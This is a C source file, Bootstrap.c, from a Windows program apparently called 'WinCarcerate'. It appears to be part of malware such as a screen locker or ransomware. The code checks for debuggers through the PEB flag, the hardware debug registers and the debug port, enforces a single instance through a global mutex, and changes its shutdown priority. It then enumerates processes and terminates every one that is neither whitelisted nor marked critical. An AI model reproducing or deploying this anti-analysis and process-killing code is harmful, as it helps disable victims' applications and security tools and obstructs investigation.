// Bootstrap.c
#include <windows.h>
#include <tlhelp32.h>
#include "Common.h"
#include "Debug.h"
#include "Bootstrap.h"

static HANDLE g_hSingleInstanceMutex = NULL;

static LPCWSTR g_ProcessWhitelist[] =
{
    L"spoolsv.exe",
    L"explorer.exe",
    L"sihost.exe",
    L"fontdrvhost.exe",
    L"cmd.exe",
    L"dwm.exe",
    L"LogonUI.exe",
    L"SearchUI.exe",
    L"lsass.exe",
    L"csrss.exe",
    L"smss.exe",
    L"winlogon.exe",
    L"services.exe",
    L"conhost.exe"
};

BOOL CheckForDebugger(void)
{
    PPEB    pPeb = FetchPPEB();
    CONTEXT ThreadCtx = { 0 };
    HMODULE hNtdll = NULL;
    DWORD   dwDebugPort = 0;
    DWORD   dwReturnLen = 0;
    fnNtQueryInformationProcess pNtQueryInformationProcess = NULL;

    // Check Process Environment Block
    if (pPeb->BeingDebugged)
    {
        return TRUE;
    }

    // Check Hardware Debug Registers (DR0-DR3)
    ThreadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (GetThreadContext(NtCurrentThread(), &ThreadCtx))
    {
        if (ThreadCtx.Dr0 || ThreadCtx.Dr1 || ThreadCtx.Dr2 || ThreadCtx.Dr3)
        {
            return TRUE;
        }

    }

    // Check Process Information (DebugPort)
    if ((hNtdll = GetModuleHandle(L"NTDLL")))
    {
        if ((pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess")))
        {
            if (pNtQueryInformationProcess(NtCurrentProcess(), ProcessDebugPort, &dwDebugPort, sizeof(DWORD), &dwReturnLen) == 0)
            {
                if (dwDebugPort != 0)
                {
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

BOOL CheckSingleInstance(void)
{
    LPCWSTR wUniqueName = L"Global\\WinCarcerate_SingleInstanceMutex";
    DWORD   dwError = 0;

    g_hSingleInstanceMutex = CreateMutexW(NULL, FALSE, wUniqueName);
    dwError = GetLastError();   // capture immediately before anything else touches it

    if (!g_hSingleInstanceMutex)
        return FALSE;

    if (dwError == ERROR_ALREADY_EXISTS)
    {
        CloseHandle(g_hSingleInstanceMutex);
        g_hSingleInstanceMutex = NULL;
        return FALSE;
    }

    return TRUE;
}

VOID ConfigureProcessExecution(void)
{
    HANDLE hProcess = NtCurrentProcess();

    if (!SetPriorityClass(hProcess, ABOVE_NORMAL_PRIORITY_CLASS))
    {
        PRNT_WIN_ERR(SetPriorityClass);
    }


    if (!SetProcessShutdownParameters(0x00, 0x00))
    {
        PRNT_WIN_ERR(SetProcessShutdownParameters);
    }

}

BOOL KillNonCriticalProcesses(void)
{
    NTSTATUS                        STATUS = 0x00;
    HMODULE                         hNtdll = NULL;
    fnNtQuerySystemInformation      pNtQuerySystemInformation = NULL;
    fnNtQueryInformationProcess     pNtQueryInformationProcess = NULL;
    ULONG                           uBufferSize = 0x00;
    PSYSTEM_PROCESS_INFORMATION     pSystemProcInfo = NULL;
    PBYTE                           pTmpBuffer = NULL;
    DWORD                           dwCurrentPid = GetCurrentProcessId();
    INT                             iWhitelistCount = ARRAYSIZE(g_ProcessWhitelist);
    BOOL                            bIsWhitelisted = FALSE;
    BOOL                            bSuccess = FALSE;
    WCHAR                           wProcessName[MAX_PATH] = { 0 };


    if (!(hNtdll = GetModuleHandleW(L"NTDLL")))
    {
        PRNT_WIN_ERR(GetModuleHandleW);
        goto CLEANUP;
    }

    if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation")))
    {
        PRNT_WIN_ERR(GetProcAddress);
        goto CLEANUP;
    }

    if (!(pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess")))
    {
        PRNT_WIN_ERR(GetProcAddress);
        goto CLEANUP;
    }

    // First call: get the required buffer size
    if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uBufferSize)) != STATUS_INFO_LENGTH_MISMATCH)
    {
        PRNT_NT_ERR(NtQuerySystemInformation, STATUS);
        goto CLEANUP;
    }

    // new processes may spawn between the two calls, growing the list.
    // Without this the second call can still return STATUS_INFO_LENGTH_MISMATCH.
    uBufferSize += 0x1000;

    if (!(pTmpBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uBufferSize)))
    {
        PRNT_WIN_ERR(HeapAlloc);
        goto CLEANUP;
    }

    // Second call: populate the buffer
    pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)pTmpBuffer;

    if (!NT_SUCCESS(STATUS = pNtQuerySystemInformation(SystemProcessInformation, pSystemProcInfo, uBufferSize, NULL)))
    {
        PRNT_NT_ERR(NtQuerySystemInformation, STATUS);
        goto CLEANUP;
    }

    while (TRUE)
    {
        HANDLE  hProcess = NULL;
        ULONG   uIsCriticalProcess = 0x00;
        ULONG   uReturnLen = 0x00;

        // Skip system idle process (PID 0) and entries with no name
        if (!pSystemProcInfo->ImageName.Buffer || !pSystemProcInfo->ImageName.Length)
            goto NEXT_ENTRY;

        // Skip our own process
        if ((DWORD)(ULONG_PTR)pSystemProcInfo->UniqueProcessId == dwCurrentPid)
            goto NEXT_ENTRY;

        // Copy the process name out of the UNICODE_STRING for safe comparisons
        // ImageName.Length is in bytes, not characters
        RtlZeroMemory(wProcessName, sizeof(wProcessName));
        RtlCopyMemory(wProcessName, pSystemProcInfo->ImageName.Buffer,
            min(pSystemProcInfo->ImageName.Length, (MAX_PATH - 1) * sizeof(WCHAR)));

        // Skip whitelisted processes
        bIsWhitelisted = FALSE;

        for (INT idx = 0; idx < iWhitelistCount; idx++)
        {
            if (lstrcmpiW(wProcessName, g_ProcessWhitelist[idx]) == 0)
            {
                bIsWhitelisted = TRUE;
                break;
            }
        }

        if (bIsWhitelisted)
            goto NEXT_ENTRY;

        if (!(hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, (DWORD)(ULONG_PTR)pSystemProcInfo->UniqueProcessId)))
            goto NEXT_ENTRY;

    
        if (!NT_SUCCESS(STATUS = pNtQueryInformationProcess(hProcess, ProcessBreakOnTermination, &uIsCriticalProcess, sizeof(ULONG), &uReturnLen)))
        {
            // On failure, assume non-critical
            uIsCriticalProcess = 0;
        }

        if (!uIsCriticalProcess)
        {
            if (TerminateProcess(hProcess, EXIT_SUCCESS))
            {
                DbgPrintW(L"[*] TERMINATED: %s (Reason: Non-Critical Process)\n", wProcessName);
            }
      
        }

    NEXT_ENTRY:
        DELETE_HANDLE(hProcess);

        if (pSystemProcInfo->NextEntryOffset == 0)
            break;

        pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo + pSystemProcInfo->NextEntryOffset);
    }

    bSuccess = TRUE;

CLEANUP:
    FREE_HEAP(GetProcessHeap(), pTmpBuffer);

    return bSuccess;
}